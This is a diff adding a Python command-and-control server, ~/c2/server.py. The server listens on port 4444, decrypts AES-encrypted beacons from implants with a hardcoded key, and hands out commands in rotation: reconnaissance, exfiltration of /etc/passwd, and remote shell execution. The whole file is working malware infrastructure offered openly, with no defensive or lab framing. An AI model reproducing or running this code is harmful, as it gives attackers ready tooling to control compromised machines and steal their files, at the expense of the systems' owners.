@@ -1,0 +1,98 @@
+# ~/c2/server.py
+import socket
+import threading
+import json
+import base64
+import hashlib
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+
+class C2Server:
+    def __init__(self, host='0.0.0.0', port=4444):
+        self.host = host
+        self.port = port
+        self.clients = {}  # beacon_id -> (socket, info)
+        self.key = hashlib.sha256(b"master_key_2026").digest()
+        
+    def encrypt(self, data):
+        cipher = AES.new(self.key, AES.MODE_CBC)
+        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
+        return base64.b64encode(cipher.iv + ct_bytes).decode()
+    
+    def decrypt(self, enc_data):
+        enc = base64.b64decode(enc_data)
+        iv = enc[:16]
+        ct = enc[16:]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        pt = unpad(cipher.decrypt(ct), AES.block_size)
+        return pt.decode()
+    
+    def handle_client(self, client_socket, addr):
+        print(f"[+] New connection from {addr}")
+        
+        try:
+            while True:
+                # Receive beacon
+                data = client_socket.recv(4096)
+                if not data:
+                    break
+                
+                try:
+                    decrypted = self.decrypt(data.decode())
+                    beacon = json.loads(decrypted)
+                    
+                    beacon_id = beacon.get('id', hashlib.sha256(str(addr).encode()).hexdigest()[:8])
+                    self.clients[beacon_id] = (client_socket, beacon)
+                    
+                    print(f"[*] Beacon from {beacon_id}: {beacon.get('hostname')}")
+                    
+                    # Send command if available
+                    command = self.get_command_for_beacon(beacon_id)
+                    if command:
+                        encrypted_cmd = self.encrypt(json.dumps(command))
+                        client_socket.send(encrypted_cmd.encode())
+                    else:
+                        client_socket.send(self.encrypt(json.dumps({"cmd": "wait"})).encode())
+                        
+                except Exception as e:
+                    print(f"[!] Error: {e}")
+                    continue
+                    
+        except Exception as e:
+            print(f"[!] Client {addr} disconnected: {e}")
+        finally:
+            client_socket.close()
+    
+    def get_command_for_beacon(self, beacon_id):
+        """Get command for specific beacon"""
+        # In reality, would have a queue of commands
+        commands = {
+            "recon": {"cmd": "recon", "args": {}},
+            "exfil": {"cmd": "exfil", "args": {"path": "/etc/passwd"}},
+            "shell": {"cmd": "shell", "args": {"command": "whoami"}}
+        }
+        
+        # Rotate through commands
+        cmd_keys = list(commands.keys())
+        if cmd_keys:
+            return commands[cmd_keys[len(self.clients) % len(cmd_keys)]]
+        
+        return None
+    
+    def start(self):
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind((self.host, self.port))
+        server.listen(5)
+        
+        print(f"[+] C2 Server listening on {self.host}:{self.port}")
+        
+        while True:
+            client_socket, addr = server.accept()
+            client_thread = threading.Thread(target=self.handle_client, args=(client_socket, addr))
+            client_thread.daemon = True
+            client_thread.start()
+
+# Run it
+c2 = C2Server()
+c2.start()
